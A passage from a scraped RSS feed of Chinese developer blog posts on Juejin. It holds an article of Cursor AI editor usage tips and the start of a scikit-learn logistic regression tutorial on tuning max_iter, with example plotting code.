<p><strong>欢迎在评论区留言——我很期待听到你们的调试“血泪史”。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[不止有 agent ，Cursor 使用技巧总结]]></title>    <link>https://juejin.cn/post/7594302398687002678</link>    <guid>https://juejin.cn/post/7594302398687002678</guid>    <pubDate>2026-01-13T01:45:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594302398687002678" data-draft-id="7567251884827131910" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="不止有 agent ，Cursor 使用技巧总结"/> <meta itemprop="keywords" content="AI编程,Cursor"/> <meta itemprop="datePublished" content="2026-01-13T01:45:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端双越老师"/> <meta itemprop="url" content="https://juejin.cn/user/1714893868765373"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            不止有 agent ，Cursor 使用技巧总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893868765373/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端双越老师
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:45:30.000Z" title="Tue Jan 13 2026 01:45:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是双越。前百度 滴滴 资深前端工程师，慕课网金牌讲师，PMP。我的代表作有：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wangeditor.com%2F" target="_blank" title="https://www.wangeditor.com/" ref="nofollow noopener noreferrer">wangEditor</a> 开源 web 富文本编辑器，GitHub 18k star，npm 周下载量 20k</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.huashuiai.com%2F" target="_blank" title="https://www.huashuiai.com/" ref="nofollow noopener noreferrer">划水AI</a> Node 全栈 AIGC 知识库，包括 AI 写作、多人协同编辑。复杂业务，真实上线。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.mianshipai.com%2F" target="_blank" title="https://www.mianshipai.com/" ref="nofollow noopener noreferrer">前端面试派</a> 系统专业的面试导航，刷题，写简历，看面试技巧，内推工作。开源免费。</li>
</ul>
<blockquote>
<p>我在正在开发一个 AI Agent 智能体项目【<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhitalk.chat%2F" target="_blank" title="https://zhitalk.chat/" ref="nofollow noopener noreferrer">智语</a>】一个智能面试官，可以优化简历、模拟面试、解答题目等。有兴趣的同学可以围观、学习。</p>
</blockquote>
<h2 data-id="heading-0">开始</h2>
<p>应该是从 2025 年下半年开始，AI 编程慢慢普及开来，我也从 VSCode 切换到 Cursor ，感觉现在越来越依赖 AI 编程。</p>
<p>遇到什么需求都要先给 Cursor 写一段 promot ，遇到 bug 都要把报错信息复制给 Cursor 等待它来解决。</p>
<p>但 Cursor 作为最强大的 AI 编程工具之一，不仅仅只有一个 input 、一个 agent 模式，它还有很多和 AI 开发相关的功能。</p>
<h2 data-id="heading-1">编写规则</h2>
<p>就像 system prompt 一样，我们可以定义当前代码库的统一的规则和要求，这是所有的 AI 编程工具都具备的功能。</p>
<p>在 <code>.cursor/rules/</code> 目录下，新建一个 <code>xxx.mdc</code> 文件，一般写当前项目的需求背景、技术栈、核心的原则和规则、注意事项等。</p>
<p>当你选择 Always Apply 时，它会在每次 AI 请求时都携带，这样就能最大程度的保障 AI 回答的准确性。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5020dafa7c754ca28b58c4d5f2ecdd24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=r9aJ6v%2BOjh4s%2FUR3NI639SVWKf0%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">tab 自动补全</h2>
<p>这是最早的 AI 编程功能，2年之前就有了，对于刚开始使用 AI 编程的人比较友好。</p>
<p>例如在一个函数内部，写上一行代码，或者一行注释，回车，AI 会自动补全接下来的代码。你使用 tab 即可自动输入这些代码。</p>
<p>当你写的函数名称、注释、代码可读性好的时候，AI 的补全准确度还是挺高的。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af0f914e7a364a7ba715a7c9cf57a1cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=aPez98aH3%2BZi%2FWV32V8rXRaOEiM%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">ctrl+k 内联编辑选取</h2>
<p>当你只想要改造一行或者几行代码时，可以选中这几行代码，使用 ctrl+k 可以弹出一个 AI 输入框，输入你的要求，只修改选中的代码。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8ccd026283a4ca083aa8f9393ba8974~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=klVt0celblVrJUQSzwE2lsJxwZc%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">Agent 模式</h2>
<p>这是最常用的方式，在右侧 input 中输入我们的需求，等待 Cursor 生成代码。同时这里的功能也最为丰富。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbfc7015e412442f844e045125405940~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=oTHVaGy3IP1rz8x7VYSnISue8Ys%3D" alt="image.png" loading="lazy"/></p>
<p>除了自己输入，你还可以选中一段代码、或着一段报错信息，点击 Add to chat 按钮，把这些内容传递给 AI</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c8d45348e9b7481caea1a5929598ba64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=OdduAHF48DDM5EKqVd8s4kwlIyw%3D" alt="image.png" loading="lazy"/></p>
<p>你可以通过 <code>@</code> 符号来增加上下文，例如这次需求可能涉及到另外几个文件，就可以引入进来，让 AI 知道。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28003446b4d241fdbda77d88ee2b989b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=ffx%2BinnUFVpUfg5S851skNmMM%2B4%3D" alt="image.png" loading="lazy"/></p>
<p>你还可以通过 <code>/</code> 来使用 command 命令</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5124b9f8783d433db9003598d2932bac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=jMXgISxdb%2FN%2BhM17uaHfQeZHrv0%3D" alt="image.png" loading="lazy"/></p>
<p>命令要自己定义，在 <code>.cursor/commands/</code> 目录下创建一个 <code>xxx.md</code> 文件即可定义一个命令</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ca5172295c643ebae076c1eafd4a171~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=9jFg%2BJCOYfnOMUM82dn6Y3d6wT8%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">Plan 模式</h2>
<p>对于一些比较复杂的功能，可以不用 agent 模式，该用 plan 模式。尽量详细的描述你的需求。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e38db31fcd8447549d80ff48f93dc933~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=pOGqcFOAOTIMui2cDi766eEa1gw%3D" alt="image.png" loading="lazy"/></p>
<p>Cursor 会根据你的需求，整理一个 plan 计划，你可以自己修改这个计划。没问题了在点击 build 按钮。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87166c153385481b966043412b267305~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=yWled5ju%2Fa%2FyFnAKULhWN0hTFxY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">配置 MCP</h2>
<p>在这个页面可以看到 Cursor 支持的所有 MCP server <a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fcn%2Fdocs%2Fcontext%2Fmcp%2Fdirectory" target="_blank" title="https://cursor.com/cn/docs/context/mcp/directory" ref="nofollow noopener noreferrer">cursor.com/cn/docs/con…</a> ，还是国外的多... 选择一个安装即可</p>
<p>安装完成，在 Cursor 设置页面可以看到这个 MCP server 以及它有几个 tools</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f5710d429794ae497dd517e66fe2035~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Y-M6LaK6ICB5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873529&amp;x-signature=IJYhiZzaog33Vo5VVhR8AFEG6NI%3D" alt="image.png" loading="lazy"/></p>
<p>MCP server 要有选择性的安装，不要安装太多，否则可能会消耗太多 tokens 或影响 AI 相应速度。</p>
<h2 data-id="heading-7">最后</h2>
<p>可以根据自己的需求多多尝试 Cursor 的使用技巧，用多了就熟练了。增加个人开发效率，而且在同事之间会显得比较专业。</p>
<p>2026 年 AI 编程将全面普及，一起加油！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大数据-211 逻辑回归的 Scikit-Learn 实现：max_iter、分类方式与多元回归的优化方法]]></title>    <link>https://juejin.cn/post/7594321135591440393</link>    <guid>https://juejin.cn/post/7594321135591440393</guid>    <pubDate>2026-01-13T01:45:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594321135591440393" data-draft-id="7594337566722424842" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大数据-211 逻辑回归的 Scikit-Learn 实现：max_iter、分类方式与多元回归的优化方法"/> <meta itemprop="keywords" content="后端,大数据,机器学习"/> <meta itemprop="datePublished" content="2026-01-13T01:45:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="武子康"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大数据-211 逻辑回归的 Scikit-Learn 实现：max_iter、分类方式与多元回归的优化方法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    武子康
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:45:31.000Z" title="Tue Jan 13 2026 01:45:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>场景：在应用 Scikit-Learn 进行逻辑回归时，如何调整 max_iter 来提高训练精度，处理未收敛的问题。</li>
<li>结论：过大的 max_iter 可能导致过拟合，实际操作中需平衡计算时间与预测精度。</li>
<li>产出：通过调整 max_iter 和 multi_class 参数，获得最优的模型训练和分类效果。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5677a15e5d1e4302a08674a66d1264ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=V2F3h3gGMx80wkMxLMBWBcZD93k%3D" alt="大数据-211 逻辑回归的 Scikit-Learn 实现：max_iter、分类方式与多元回归的优化方法" loading="lazy"/></p>
<h2 data-id="heading-1">版本矩阵</h2>





















<table><thead><tr><th>已验证版本</th><th>说明</th></tr></thead><tbody><tr><td>Scikit-Learn 0.24+</td><td>使用 LogisticRegression 类的 max_iter 和 multi_class 参数</td></tr><tr><td>Python 3.8+</td><td>适用于该版本的 Python 环境</td></tr><tr><td>matplotlib 3.4+</td><td>绘制学习曲线和准确度变化图</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f31d5b364d94e5c838079b3d4a1a816~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=wfG93PaLu%2FiU6KTNXs33sHp64ik%3D" alt="大数据-211 逻辑回归的 Scikit-Learn 实现：max_iter、分类方式与多元回归的优化方法" loading="lazy"/></p>
<h2 data-id="heading-2">逻辑回归的Scikit-Learn实现</h2>
<p>续接上一节剩余的内容。</p>
<h3 data-id="heading-3">max_iter</h3>
<p>逻辑回归的数学目的是求解能够让模型最优化，你和成都最好的参数w的值，即求解能够让损失函数J（w）最小化的w值。对于二元逻辑回归来说，有多种方法可以用来求解参数w，最常见的有梯度下降法（Gradient Descent），坐标下降法（Coordinate Descent），牛顿法（Newton-Raphson method）等，其中又以梯度下降法最著名。每种方法都涉及到了复杂的数学原理，但这些计算在执行的任务其实是类似的。
来看看数据集下的max_iter的学习曲线：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression <span class="hljs-keyword">as</span> LR
<span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split
<span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> load_breast_cancer

<span class="hljs-comment"># 加载数据集</span>
data = load_breast_cancer()
X = data.data
y = data.target

<span class="hljs-comment"># 定义存储结果的列表</span>
l2 = []
l2test = []

<span class="hljs-comment"># 划分训练集和测试集</span>
Xtrain, Xtest, Ytrain, Ytest = train_test_split(X, y, test_size=<span class="hljs-number">0.3</span>, random_state=<span class="hljs-number">420</span>)

<span class="hljs-comment"># 使用不同的最大迭代次数进行训练</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> np.arange(<span class="hljs-number">1</span>, <span class="hljs-number">201</span>, <span class="hljs-number">10</span>):
    <span class="hljs-comment"># 使用L2正则化，改变最大迭代次数</span>
    lrl2 = LR(penalty=<span class="hljs-string">"l2"</span>, solver=<span class="hljs-string">"liblinear"</span>, C=<span class="hljs-number">0.9</span>, max_iter=i)
    lrl2 = lrl2.fit(Xtrain, Ytrain)
    l2.append(accuracy_score(lrl2.predict(Xtrain), Ytrain))
    l2test.append(accuracy_score(lrl2.predict(Xtest), Ytest))

<span class="hljs-comment"># 将训练集和测试集的结果绘制成图</span>
graph = [l2, l2test]
color = [<span class="hljs-string">"black"</span>, <span class="hljs-string">"gray"</span>]
label = [<span class="hljs-string">"L2"</span>, <span class="hljs-string">"L2test"</span>]

plt.figure(figsize=(<span class="hljs-number">20</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># 绘制图形</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(graph)):
    plt.plot(np.arange(<span class="hljs-number">1</span>, <span class="hljs-number">201</span>, <span class="hljs-number">10</span>), graph[i], color[i], label=label[i])

plt.legend(loc=<span class="hljs-number">4</span>)  <span class="hljs-comment"># 图例位置右下角</span>
plt.xticks(np.arange(<span class="hljs-number">1</span>, <span class="hljs-number">201</span>, <span class="hljs-number">10</span>))  <span class="hljs-comment"># 设置x轴刻度</span>
plt.xlabel(<span class="hljs-string">'Max Iterations'</span>)
plt.ylabel(<span class="hljs-string">'Accuracy'</span>)
plt.title(<span class="hljs-string">'Accuracy vs Max Iterations'</span>)
plt.show()

<span class="hljs-comment"># 打印本次求解中真正实现的迭代次数</span>
